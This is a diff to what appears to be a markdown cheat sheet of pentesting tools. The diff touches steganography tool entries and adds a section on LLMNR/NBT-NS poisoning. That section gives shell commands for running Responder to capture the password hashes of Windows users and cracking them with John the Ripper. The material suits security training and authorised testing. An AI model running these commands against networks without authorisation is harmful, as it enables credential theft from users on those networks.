@@ -157,10 +157,33 @@ SNOW.EXE -C -p 1234 -m "Secret Message"  original.txt ciper.txt
  
 SNOW.EXE -C -p 1234  ciper.txt
 ```
+  
 > [OpenStego](https://github.com/syvaidya/openstego/releases) : Hide any data within a cover file like Images
 <img src="https://www.openstego.com/image/screenshot/01.png" width="600" height="400" />
 <img src="https://www.openstego.com/image/screenshot/02.png" width="600" height="400" />  
   
-> [QuickStego](http://cybernescence.co.uk/software-products/QS12Setup.exe)
-<img src="  http://quickcrypto.com/content-images/QuickStego_12_Steganography_Software_Ex_sml.jpg" width="600" height="400" /> 
+> [QuickStego](http://cybernescence.co.uk/software-products/QS12Setup.exe): Hide text in pictures without password
+<img src="http://quickcrypto.com/content-images/QuickStego_12_Steganography_Software_Ex_sml.jpg" width="600" height="400" /> 
 </details>
+
+  
+  
+#  LLMNR/NBT-NS Poisoning
+<details>
+<summary> LLMNR/NBT</summary>
+> [Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes
+>
+>> This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+  
+```shell
+# In Parrot/Kali OS, 
+responder -I eth0  ↵
+
+# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
+# To crack that hash, use JohntheRipper
+john SMB<filename>  ↵
+  
+```
+
+
+  
